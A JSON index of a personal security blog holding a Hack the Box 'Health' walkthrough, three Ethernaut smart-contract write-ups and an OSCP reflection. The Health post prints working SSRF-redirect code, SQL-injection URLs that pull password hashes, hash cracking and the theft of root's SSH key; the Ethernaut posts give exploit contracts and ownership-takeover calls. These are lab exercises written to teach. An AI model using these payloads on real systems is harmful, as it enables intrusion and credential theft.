[ { "title": "Health from Hack the Box", "url": "/posts/htb-health/", "categories": "HTB, Write-up", "tags": "write-up, hacking, htb", "date": "2023-01-08 00:00:00 +0000", "snippet": "Box Info     Name Health Release Date 22 August 2022 Retire Date 07 January 2023 OS Linux Difficulty   Difficulty Chart   Radar Graph Creator Name https://www.hackthebox.com/home/machines/profile/491 MethodologyNmap scansudo nmap -sC -sV -oN scans/default-scan.nmap $targetPort 80Laravel Ubuntu Apache HTTP Server 2.4.29phpWeb Applicationhealth.htbThe web application is a health checking application for web servers. It will go the the given url and and check if there is a response then the service will send a JSON document with the contents of that URL.This could allow for an Server Side Request Forgery (SSRF attack). It may be possible to use this server to contact a service that cannot be reached from our perspective on the network. A target we can test this on would be the filtered port 3000 on the target system. The filtered status suggest that there may be something listening on that port but we are being blocked by a firewall.The web application does not all you to add the target system as the monitored URL. Even if we try to trap the request and modify the request which suggests the check is being done server side.To get around this restriction we can try to redirect to the server that you are trying to access. Our server will send a redirect to an internal server. The vulnerable server will then make a new request to the redirected location and return the results of that internal service.Setup a Redirect with Python3#!/usr/bin/env python3import sysfrom http.server import HTTPServer, BaseHTTPRequestHandlerif len(sys.argv)-1 != 2: print(\"\"\"Usage: {} &lt;port_number&gt; &lt;url&gt; \"\"\".format(sys.argv[0])) sys.exit()class Redirect(BaseHTTPRequestHandler): def do_GET(self): self.send_response(302) self.send_header('Location', sys.argv[2]) self.end_headers()HTTPServer((\"\", int(sys.argv[1])), Redirect).serve_forever()The above code comes from: https://stackoverflow.com/a/47084250sudo python3 redirect.py 80 \"http://10.10.11.176:3000\"Start a netcat listener to listen for the response:nc -nvlp 1338Fill out the form on the page to monitor your redirect on port 80 and the webhook to be your netcat listener then click Test.We find out that it is a Gogs version 0.5.5 server listening on that port. This is a git server similar to GitHub or GitLab but written in GoLang.Exploiting GogsThe internal service running on 3000 is Gogs (a git server). This version (0.5.5.1) is vulnerable to SQLi https://www.exploit-db.com/exploits/35238.We could look at the POC in the exploitdb write-up, but I want to explore this SQLi a little on my own. All I’m going to do is look at the endpoint and variable that is vulnerable and go from there.It is easiest if we make the exploit as easy as possible so I will set up a local install of the Gogs v0.5.5After playing with the docker installation and not being able to get it up and running, I asked NullB1te on discord how he got his up and running. He went the smart route and pulled the package from the releases section GitHub. (Thanks NullB1te for reminding me that sometimes you should just pull from the releases section and make life easier.)Download and unzip the v0.5.5 of Gogs then run the executable.Set up the environment with SQLite and an admin of your choosing. Once you have all that set up, you can start testing the exploits on your local instance to see if they even work against the target.First, we need to verify that it is vulnerable with a simple test.sudo python3 redirect.py 80 \"http://10.10.11.176:3000/api/v1/repos/search?q=1')/**/or/**/1=1/**/--\"Now that we know we have SQLi, we can start working on how many fields we need.curl --silent \"http://localhost:3000/api/v1/users/search?q=man716')/**/Order/**/By/**/100/**/--\" | jq{ \"error\": \"1st ORDER BY term out of range - should be between 1 and 27\", \"ok\": false}Fortunately, the error code gives us the answer right away.Next, we need to figure out which one of the 27 we can control.curl --silent \"http://localhost:3000/api/v1/users/search?q=man716')/**/union/**/all/**/select/**/'1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27'/**/--\" | jq{ \"data\": [ { \"username\": \"man716\", \"avatar\": \"//1.gravatar.com/avatar/4c6fb260e2dd60fa4694a02b84e6fb84\" }, { \"username\": \"3\", \"avatar\": \"//1.gravatar.com/avatar/15\" } ], \"ok\": true}Looks like the third one in is our target.Now let’s start our enumeration directly on our targetTo catch the response I decide to play around with ChtGPT and asked to create a python 3 script for me write a python3 http server that will check if the response_body has JSON and if it does parse and output the JSON in pretty format to the consoleAfter a little modification I came up with:import jsonfrom http.server import HTTPServer, BaseHTTPRequestHandlerclass RequestHandler(BaseHTTPRequestHandler): def do_POST(self): print(\"received a post request\") # Read the request body content_length = int(self.headers['Content-Length']) request_body = self.rfile.read(content_length) # Parse the request body as JSON try: data = json.loads(request_body) except ValueError: self.send_response(400) self.send_header('Content-Type', 'text/plain') self.end_headers() self.wfile.write(b'Invalid JSON') return # Output the parsed JSON to the console print(json.dumps(data, indent=4, sort_keys=True)) # Send a response to the client self.send_response(200) self.send_header('Content-Type', 'text/plain') self.end_headers() self.wfile.write(b'Request received')httpd = HTTPServer(('0.0.0.0', 1338), RequestHandler)httpd.serve_forever()python3 ./server.pyLet’s attempt to get the version of the database.sudo python3 redirect.py 80 \"http://10.10.11.176:3000/api/v1/users/search?q=e')/**/union/**/all/**/select/**/null,null,(select/**/@@version,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1--\"We get an error back saying that the site is not up.sudo python3 redirect.py 80 \"http://10.10.11.176:3000/api/v1/users/search?q=e')/**/union/**/all/**/select/**/null,null,(select/**/version()),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1--\"We get an error back saying the site is not up.sudo python3 redirect.py 80 \"http://10.10.11.176:3000/api/v1/users/search?q=e')/**/union/**/all/**/select/**/null,null,(select/**/sqlite_version()),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1--\"Success we see that the sqlite version is 3.8.5Now that we know what database it is, we can get the tables that are available.sudo python3 redirect.py 80 \"http://10.10.11.176:3000/api/v1/users/search?q=e')/**/union/**/all/**/select/**/null,null,(SELECT/**/tbl_name/**/FROM/**/sqlite_master),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1--\"Get the columns of the table\"http://10.10.11.176:3000/api/v1/users/search?q=e')/**/union/**/all/**/select/**/null,null,(SELECT/**/sql/**/FROM/**/sqlite_master/**/WHERE/**/type!='meta'/**/AND/**/sql/**/NOT/**/NULL/**/AND/**/name/**/='user'),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1--\"Looks like I did not mark all of the colums but I got the two that we need most. Can you find the ones I missed?Let’s get the password:sudo python3 redirect.py 80 \"http://10.10.11.176:3000/api/v1/users/search?q=e')/**/union/**/all/**/select/**/null,null,(select/**/passwd/**/from/**/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1--\" Let’s grab the salt:sudo python3 redirect.py 80 \"http://10.10.11.176:3000/api/v1/users/search?q=e')/**/union/**/all/**/select/**/null,null,(select/**/salt/**/from/**/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1--\"I have no idea what algorithm is used to hash the password. The good news is that this is an open source application so we can dig through the code if no one else has.Lucky for us again someone else dug through the application to find where the password is hashed.https://blog.stigok.com/2017/03/06/lost-password-to-gogs-git-server-docker-instance.htmlThis blog post points out that the password is hashed as follows:newPasswd := pbkdf2.Key([]byte(u.Passwd), []byte(u.Salt), 10000, 50, sha256.New)Since I have no idea what this even means, I had to dig into the module and function.https://pkg.go.dev/golang.org/x/crypto/pbkdf2#pkg-functionsThe key function is defined as below:func Key(password, salt []byte, iter, keyLen int, h func() hash.Hash) []byteSo the function takes a password, byte array for salt, the iterations the algorithm will go through, they length of the output key in bytes, and the PRN (pseudo random number) function.So this means that Gogs uses PBKDF2 with SHA256 PRN with 10000 iterations and a length of 50 bytes. At least, that is how I understand it. Since the output of the function is a byte array, the hash is probably stored in hex.https://hashcat.net/wiki/doku.php?id=example_hashesDigging around to figure out how to crack this I came around to the hashcat algorithm PBKDF2-HMAC-SHA256 (10900)with the example hash: sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCntSo it looks like the salt is in base64 and the password may be as well because that is definitely not hex.The question is how do we get hex back to bytes then into base64?This where I get to play with a tool I do not use much at all xxd.Using xxd -r we can convert the hex into binary then we need to output it back out int a hex that we convert to base64echo '1c84...b55655d' | xxd -r -ps | base64HIT2z...V0= &gt; passbase64 the saltecho $salt | base64 &gt; saltcreate the hashcat friendly hashecho \"sha256:10000:$(cat salt):$(cat pass)\" &gt; hashcrack the passwordhashcat -m 10900 ./hash /usr/share/wordlists/rockyou.txtThis will take awhile.Once you have the password cracked, you can login to sshssh susanne@10.10.11.176Privilege EscalationMoving on up to root takes a little investigative work but is not all that difficult.After the normal enumeration, there really was not anything too interesting to work on so I decided to see if there were any interesting tasks running occasionally. This is usually indicative of another user who has a cron (or other scheduler) job running. The easiest way to monitor these tasks is to use pspy. Once that is running, there is a command that may stand out: That is interesting but I have no clue as to what it is doing. But after some googling around and looking into Laravel, this is basically running whatever code is in the Laravel web application located /var/www/html/app/Console/Kernel.php and the function schedule. We can take a look and see what is happening with that code and see that it is getting all of the tasks from the database and then using HealthChecker’s check function. After digging around a bit we find that function /var/www/html/app/Http/Controllers/HealthChecker.php. We should also note that it is being rand as root.The interesting part is that it is using @file_get_contents which could allow us to get a file of our choosing from the system.Unfortunately, the application blocks us from just getting a file and instead gives us an error.However, now that we are on the system, we may be able to find database creds and change the monitoredURL there?Back to digging around…Learning a bit more about Laravel, it uses a .env file to load environment variables to help with configuration of the application. The .env file is supposed to reside at the root of the application. After looking there and opening the file up we get mysql creds.mysql -ularavel -pLog in and see what we can see.mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || laravel |+--------------------+2 rows in set (0.00 sec)mysql&gt; use laravel;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+------------------------+| Tables_in_laravel |+------------------------+| failed_jobs || migrations || password_resets || personal_access_tokens || tasks || users |+------------------------+6 rows in set (0.00 sec)With this, I assume that all tasks are getting put under “tasks”.mysql&gt; select * from tasks;Empty set (0.00 sec)There are no tasks at the moment.Since we are already on the system, what file should we grab? Let’s look and see what the ssh configuration allows.cat /etc/ssh/sshd_config | grep -v '^[#]' | grep .ChallengeResponseAuthentication noUsePAM yesPermitRootLogin yesX11Forwarding yesPrintMotd noAcceptEnv LANG LC_*Subsystem sftp /usr/lib/openssh/sftp-serverPasswordAuthentication yesAwesome root is allowed to log in using ssh. Since we do not have the password for root, we can hope that they have a ssh key. The most common of which is id_rsa. There are other common ones as well such as id_dsa, id_ecdsa, and id_ed25519.With that being said let’s change the task to see if id_rsa exists for the root user.update tasks set monitoredUrl='file:///root/.ssh/id_rsa';Be careful with this command because it will update all of the tasks with the new monitoredUrl. Changing all of them is not a good idea in a real environment. However, we are running against a clock that deletes these tasks every minute so we are going to use the quick and dirty route for this.We will use the file filter to get the file from the local machine instead of using the expected http filter to get a webpage.It worked:Copy and paste it into a file. The easiest way that I was able to do it was to use:echo -n '&lt;RSA_KEY&gt;' &gt; keyThis will strip the new line characters.Change the permissions to 600 and log in as root.chmod 600 ./keyssh -i ./key root@10.10.11.176This was a really fun box. I hope you enjoyed the walkthrough. If you have any questions or corrections, feel free to contact me on Discord: Man715_#5234." }, { "title": "Ethernaut 03 Coin Flip", "url": "/posts/ethernaut-03-coin-flip/", "categories": "Smart Contract, Write-up", "tags": "write-up, hacking, smart-contract", "date": "2022-08-05 00:00:00 +0000", "snippet": "IntroductionThe objective of this challenge is to correctly guess the coin flip ten consecutive times. This challenge demonstrates the difficulty of creating randomness in a deterministic system such as the blockchain. Since all the validator nodes need to come to the same exact answer, it is impossible to have a truly random result for each time the code is executed.AssessmentKnowing our objective is to win the coin flip 10 consecutive times, we will first look at how the coin flip is determined by analyzing the flip() function.function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.number.sub(1))); if (lastHash == blockValue) { revert(); } lastHash = blockValue; uint256 coinFlip = blockValue.div(FACTOR); bool side = coinFlip == 1 ? true : false; if (side == _guess) { consecutiveWins++; return true; } else { consecutiveWins = 0; return false; } }}Looking at this function, we see that the developers are using the the block number minus one to generate a pseudo random number.VulnerabilityThe issue with using the block number as a pseudo random number is that it can be predicted. Using a malicious smart contract, an attacker can create the same exact pseudo random number to generate what the coin flip is going to be then in the same transaction submit the answer to the target contract.ExploitationTo exploit this vulnerability, we will need to first create our own smart contract that will generate the pseudo random number and create the answer that will be submitted to the target contract.pragma solidity ^0.6.0;interface Victim { function flip(bool) external returns(bool);}contract CoinFlip { uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; Victim victim = Victim(0xf36B5b5001edBAB9a9371bc7865E4b60fa4B4E82); function guess() public { uint256 blockValue = uint256(blockhash(block.number - 1 )); uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; victim.flip(side); }}Much of this code should look familiar because it is simply copied from the target contract. For instance, we take the FACTOR, blockValue, coinFlip, and the side code directly from the target because that is how the answer is determined. We then send the target contract the guess which uses the same block number since the attacker code and the target code are ran in the same transaction.Lesson(s)Randomness on a deterministic system is impossible. You must find a way to generate a number from several sources and one needs to be from a source that cannot be known before hand.Fuzzing with EchidnaTo successfully and predictably break the contract, we should be able to not only guess 10 consecutive times but even 100 or more times. When I run the test for greater than 10 times, the fuzzer is able to make the contract fail using multiple senders. However, test it for 100 times or more. with using psender or sender the invariant does not fail.The fuzzer does potentially lead you down the right path for solving this issue as it does cause the invariant to fail on 10 consecutive tries with time/block delays. However, in my testing it does not help discern what delay will give consistent predictable results.One thing to note is that the solution to this problem is not using a delay but instead to use the block hash to determine if the coin flip result will be heads or tails.SetupThis does not require any setup.Test Setupfunction echidna_test_flip() public view returns(bool) { return consecutiveWins &lt;= 10; }I tested with the consecutiveWins at 10, 50, and 100.Run Testechidna-test --config config.yaml Test.sol --contract Testhttps://github.com/man715/echidna-ctf/tree/main/ethernaut" }, { "title": "Ethernaut 02 Fallout", "url": "/posts/ethernaut-02-fallout/", "categories": "Smart Contract, Write-up", "tags": "write-up, hacking, smart-contract", "date": "2022-07-23 00:00:00 +0000", "snippet": "IntroductionThe objective for this challenge is it take ownership of the contract.To be honest, this challenge is pretty pointless in and of itself; however, I think we can still learn something from it. Let’s take a look.According to the solidity documentation, Prior to version 0.4.22, constructors were defined as functions with the same name as the contract. This syntax was deprecated and is not allowed anymore in version 0.5.0.Although now this contract’s pragma is ^0.6.0, it was originally compiled with a version in the 0.4.xx.AssessmentIf you look closely, you will notice that there is a function named Fal1out which is not the same as the contract name which is Fallout.VulnerabilityThe function that sets the owner can be called by anyone. The intention was for it to be the constructor function and set the creator’s address as the owner. Unfortunately, this mistake just created a function that will set any address that calls it as the owner.ExploitationTo exploit this contract, all we have to do is to call the Fal1out function. contract.Fal1out({ from: player, value: toWei(\".0001\", \"ether\") })Lesson(s)Although this particular vulnerability has been fixed at compilation, there is still something that we can take from this challenge. Attention to detail is critical when it comes to reviewing code. Do not make assumptions on what something is doing. It could vary well be that the implementation of that portion of the code is not doing what you and the author thought at first glance. Any critical functions need to be understood fully.Fuzzing with EchidnaSetupThis contract does not require any setup.Test SetupThis requires a very simple test of check if the owner is the msg.sender. If it is, the test should return false since that is not the ideal result.function echidna_is_owner() public view returns(bool) { if (owner == msg.sender) { return false; } else { return true; }Run the testechidna-test Test.sol --contract Test" }, { "title": "Ethernaut 01 Fallback", "url": "/posts/ethernaut-01-fallback/", "categories": "Smart Contract, Write-up", "tags": "write-up, hacking, smart-contract", "date": "2022-07-09 00:00:00 +0000", "snippet": "IntroductionThe introduction gives us four hints so first let’s check those out. How to send ether when interacting with an ABI How to send ether outside of the ABI Converting to and from wei/ether units Fallback methodsFallback FunctionThe fallback function is designed to be called under specific circumstances. The function called is not found. The contract was sent Ether without any data.For this contract we are only really concerned with the receive() function which will be called by instead of the fallback function when it exists and the contract was sent Ether without any data.Sending Ether to a contractThere are a few ways you can send Ether to a contract. The first is by calling a function on the target contract that does not exist. The contract will always default to using the fallback function if the function is not found. You can also trigger the fallback function by sending Ether to the contract without sending any data with the transaction. This will trigger the receive function if it exists but will trigger the fallback if the receive function does not.Converting Wei/EtherSolidity uses fixed-point arithmetic. Fixed-point arithmetic represents fractional values as a multiple of some fixed unit size. In the case of Ether, that size is 10^18(1000000000000000000). This means that one Ether is 110^18 and two Ether is 210^18. The smallest unit of Ether is known as a Wei. So one Wei is represented as 1. The other important unit of size is the Gwei which is 10*9. This is important because that is the unit of measurement used for gas.To convert 10 Ether to Wei: 10 * 10^18. To convert 10000000000000000000 Wei to Ether: 10000000000000000000 / 10^18.Frameworks such as web3.js or web3.py can convert it for using unit size name.The Solidity language also allows you to use the unit size name to convert as well. The example from the documentation is as follows.assert(1 wei == 1);assert(1 gwei == 1e9);assert(1 ether == 1e18)The objective of this challenge is to claim ownership of the contract and reduce the contract’s balance to 0.AssessmentSince we already know our objective is to put our address in the owner variable, we will first look at all the places that is set. The first place is in the constructor but that has already ran during the construction of the contract which sets the variable to the address of the contract creator’s.The next place where the owner can be set is in the contribute() function and can be called by anyone which can be seen by the fact it is a public function and does not have the onlyOwner modification. This function allows a user to send less than 0.001 ether (1000000000000000 Wei) to the contract. If the user has more contributions than the current owner, the user becomes the owner. Maybe we can get lucky and the owner has not contributed anything or just very little!await contract.owner()'0x9CB391dbcD447E645D6Cb55dE6ca23164130D008'BigInt(await contract.contributions('0x9CB391dbcD447E645D6Cb55dE6ca23164130D008'))1000000000000000000000nUnfortunately, the owner has 1000000000000000000000 Wei or 100 Ether in contributions. That means would need to make more than 1 * 10^24 transactions! I don’t think we have enough Ether to cover the gas for that many transactions let alone have 100 Ether to contribute. Let’s see if we can find another way. It is interesting to note that although the contract says that the owner has 100 Ether worth of contributions, the contract’s balance is 0 which can be seen with await web3.eth.getBalance(contract.address).Okay the receive() function also changes the owner and can be called by anyone. Let’s take a closer look at this function since it is short it should be pretty easy.receive() external payable { require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0); owner = msg.sender;}As we discussed before, the receive function will be called if anyone sends the contract any Ether without any data. Since the function is payable, it will not reject the transaction. Lastly, the function is external which means that only calls to this contract from outside of itself can call this contract. Meaning that any other contract or externally owned account (user account) can make a call to this contract. The require statement is check that the transaction contains at least 1 Wei and that the sender has contributed to the contract before by calling the contribute() function. If we can satisfy both criteria, we can take over ownership. Notice how the check does not verify that the transaction sender has more Ether than the owner. This means that we can submit any amount to the contribute() function and to the receive() function and take over the contract.VulnerabilityThe fallback and receive functions should be simple functions that do not have any state changes let alone perform critical functions. These functions can be called by anyone at any time.ExploitationExploiting this contract is fairly straight forward once you understand what it is doing. First, we need to make a contribution. Next, we need to send some Ether to the contract.await contract.contribute({value: 1})await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')})await contract.withdraw()Lesson(s)While you should implement a fallback and receive function, you should use caution if either of those two functions perform any state changes or critical functionality.The fallback and receive functions should be used to check conditions instead of performing critical logic.Fuzzing with EchidnaThe files used can be found here: https://github.com/man715/echidna-ctfLooking at the contract and the goal, we know we want to take ownership and drain the contract of all of its funds.SetupFirst, we should set up the config file so that the sender address is predictable and not randomized and make sure that the contract is supplied with some ether.config.yaml:sender: [\"0x10000\"]balanceContract: 1000Next, modify the target contract. Unfortunately, Echidna cannot reach receive() as a fallback function yet; however, it is being worked on. So to make sure we can reach all functions, we need to put function in front of the recieve() function definition.Test SetupTo test for this we can create a very simple test function.function echidna_owner_and_drain_funds() public view returns(bool) { if (owner == msg.sender) { return address(this).balance &gt;= 1000; } else { return true; }This function first checks to make sure the sender has owner ship of the contract then verifies if the contract still has the amount of ether we initially supplied it with.Run TestNow run echidna from within the docker image.echidna-test --config config.yaml Test.sol --contract Testhttps://github.com/man715/echidna-ctf/tree/main/ethernaut" }, { "title": "My OSCP Journey", "url": "/posts/my-oscp-journey/", "categories": "OSCP, Hacking", "tags": "oscp, hacking, certification", "date": "2021-10-08 00:00:00 +0000", "snippet": "My OSCP JourneyThere are a lot of blog posts out there where people talk about their journey to getting the OSCP and I’d like to add my two cents. This is not going to be a how to pass the OSCP. This blog post may not even give you anything you can use to help you pass the OSCP. It is simply me discussing what I did and how I felt about the OSCP.Why did I take the OSCP?First of all, I would not have taken the OSCP if I had to pay for it out of pocket. I’m not saying one should not pay for it, but it was not something that I would have paid for. In my current role as a systems administrator and data security administrator, it does not have a direct impact on my job and offensive security was not the direction I was intending on going. So in short, I did not see a need for me to spend my money on, but my organization offered to pay for it, so I took it.Now that I have went through the process, I am interested in moving to the offensive side of cybersecurity. With that in mind, I’m still not 100% sure I would have actually pay for it out of pocket but I’m happy that I have had the experience. One thing that I really liked about taking the course was the structure. Structure helps me keep a logical process of learning, and for me, that is very helpful. Another important aspect about the training was the practical side. Applying new knowledge in new ways is important for reinforcing learning. However, I feel like these experiences can be had using other resources that are cheaper and or free.How long did the process take?The quick answer here is that it took me a year to prep, take, and pass the exam. I had 90 days of lab access. My wife and I planned out a study schedule that would include 8 hours of study time during the work days and 11 or 12 hours during the weekends. This meant that I woke up at 5 am and went to bed around 11 pm every day of the week. This went on for the entire time I had access to the lab.Even after all of that time spent studying and hacking, I was not comfortable with taking the exam after my lab access was completed. Since I was not feeling comfortable with taking the exam and every where I looked I heard stories of people failing on their first try, I decided that I was not going to take the exam. To make matters even worse, work was crazy stressful, I ended up losing my step-mother who raised me since I was 4, and I had a baby on the way. So, all signs pointed to not taking the exam. The exam seemed like a high stress and low yield event for me. I went through the course and the lab and gained a ton of knowledge but having the certificate was not really going to do anything for me. Oh and a little background on me: I have general anxiety disorder so I spend the most of my day anxious as hell anyway. All signs point towards not taking the exam. Not a single bone in my body thought I stood a chance and what’s the point if you know you are going to fail?My rock… my lighthouse… my wife told me that I should take the exam. She argued that even if I didn’t pass, it would be a good learning experience. She, as usual, was right. I went this far I needed to go the distance. I needed to see this all the way through and she was right there behind me cheering me on. At this point we were pretty close to having our baby girl and so we decided that I would take the exam the very last weekend that I could before the exam expired. For the most part, the majority of that time was spent with my newborn with a little bit of hacking, reading, and studying as I could.What was my exam experience?The week leading up to the exam was stressful. I could not get my mind off the fact that there was no way I was prepared for this grueling exam. Many more people with much more experience in offensive security failed multiple times on this exam. My family and friends just kept reminding me that pass or fail its all about learning.The day of the exam quickly arrived and I spent from 9 am to 5am hacking away at this exam. It took me 3 hours to get the buffer overflow (everyone I heard talk about it, said it should only take 30 min to an hour). I was demoralized from the start. A nagging voice in my head kept asking, “Why continue? You are already way behind.” I wanted to give up, throw in the towel and walk away. I could hear my niece in the other room with my father-in-law, brother-in-law, and wife and all I wanted to do was go hang out with them. So I stepped away from my computer, angry, frustrated, and low. But during my little break, I was curious as to if I could get into any of the other machines so I decided to keep on going.I went through this cycle for the rest of the exam. On every box, every rabbit hole, I had to fight the urge to quit. I kept telling myself that this is over my head, too hard, too stressful. But every time I wanted to quit I took a short break and came back still stressed, still frustrated, but with more patience and curious as to what I was missing. That fight was the hardest part of the exam.The entire OSCP process showed me that the hardest enemy to overcome sometimes is yourself. I think this is the most valuable lesson I took away from the OSCP exam and this is an important lesson.So, What Now?Now, I get on the hunt. After going through this entire process I have learned so much about hacking and so much more about myself. Although I feel a little burnt out, I’m excited to take a little break and find a role on the offensive side of security.Resources UsedStudying Resources https://niiconsulting.com/checkmate/2017/06/a-detail-guide-on-oscp-preparation-from-newbie-to-oscp/ https://www.slideshare.net/InfosecTrain/oscp-preparation-guide-infosectrain https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html https://web.archive.org/web/20210308064709/https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ https://www.jaiminton.com/cheatsheet/Pentest# https://sushant747.gitbooks.io/total-oscp-guide/content/ https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/ https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/Reference http://www.fuzzysecurity.com/tutorials/16.html http://pwnwiki.io/#!privesc/windows/index.md https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ https://book.hacktricks.xyz/ https://book.dragonsploit.comPracticing https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0 https://tryhackme.com/room/brainpan https://tryhackme.com/room/bufferoverflowprep" } ]
